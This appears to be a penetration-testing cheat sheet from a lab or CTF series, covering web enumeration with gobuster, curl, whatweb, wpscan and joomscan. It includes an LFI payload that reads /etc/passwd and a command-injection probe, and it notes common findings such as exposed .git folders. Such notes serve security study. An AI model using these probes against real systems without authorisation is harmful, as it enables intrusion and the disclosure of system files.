## 🌐 Web Enumeration (Machines 121–130)

### Common Directories and Files
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
curl -I http://<IP>/admin
curl -I http://<IP>/.git/
curl -I http://<IP>/backup/
```

### Vulnerable Endpoints and Functionalities
```bash
curl http://<IP>/index.php?file=../../../../etc/passwd  # LFI
curl -X POST -d "cmd=whoami" http://<IP>/cmd.php       # Command Injection
```

### CMS and Panel Detection
```bash
whatweb http://<IP>
wpscan --url http://<IP> --enumerate u
joomscan --url http://<IP>
```

### Interesting Findings from Machines 121–130
- Multiple machines exposed `.git` folders, leading to credential or source code leaks.
- Several exposed `/backup/` or `/old/` folders containing config files.
- WordPress installations allowed for user enumeration or vulnerable plugin discovery.
- Upload features with no content-type validation allowed file upload bypasses.

